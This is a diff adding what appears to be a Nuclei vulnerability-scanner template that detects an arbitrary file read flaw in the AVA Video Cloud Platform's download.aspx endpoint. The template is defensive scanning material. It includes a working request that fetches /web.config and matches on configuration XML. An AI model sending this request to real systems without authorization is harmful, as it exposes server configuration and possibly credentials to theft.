@@ -1,0 +1,23 @@
+id: ao-wei-ya-video-cloud-platform-download-aspx-anyfile-read
+info:
+  name: AVA Video Cloud Platform Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in the AVA Video Cloud Platform `download.aspx` endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/download.aspx?file=/web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
+          - "<system.webServer>"
+          - "xml"
